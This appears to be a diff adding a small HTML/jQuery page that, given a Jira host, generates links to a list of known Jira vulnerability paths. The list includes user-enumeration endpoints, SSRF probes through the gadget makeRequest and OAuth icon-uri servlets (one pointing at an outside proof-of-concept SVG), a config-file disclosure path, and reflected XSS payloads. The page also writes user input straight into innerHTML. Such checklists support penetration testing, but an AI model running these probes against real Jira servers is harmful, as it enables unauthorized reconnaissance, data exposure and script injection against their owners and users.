@@ -1,0 +1,58 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.0.min.js"></script>
+	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="style.css"/>  
+</head>
+<body>
+	<div class="wrap">
+ 		<div align="center" class="search">
+          		 <input type="url" value="jira.evil.com" id="get" class="searchTerm">
+           		<button type="button" id="button" class="searchButton">Get</button>
+		</div>   
+		<p align="center" id="links"></p>
+	</div>
+
+<script>
+
+$(document).ready(function(){
+    $('#button').click(function(e) {  
+        var get = $("#get").val();
+
+		if (get.indexOf("http://") != 0 && get.indexOf("https://") != 0) {
+
+	        	change = "";		
+    			var change = "http://" + get;
+			get = change; 
+    		}
+
+	const links = [ 
+			"/secure/QueryComponent!Default.jspa",
+			"/secure/popups/UserPickerBrowser.jspa",
+			"/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true",
+			"/secure/ViewUserHover.jspa?username=admin",
+			"/plugins/servlet/gadgets/makeRequest?url=https://<host_name>:1337@example.com", 
+			"/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
+			"/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg",
+			"/rest/api/2/user/picker?query=admin",
+			"/secure/ContactAdministrators!default.jspa",
+			"/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search",
+			"/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)",
+			"/secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false",
+	       	      ];
+
+	let link = "";
+	for (let i = 0; i < links.length; i++) {
+ 		link += get + links[i] + ' <a href="'+ get + links[i] +'" target="_blank">check</a><br><br>';
+	}
+	document.getElementById("links").innerHTML = link;
+
+
+    });
+});
+</script>
+
+</body>
+</html>
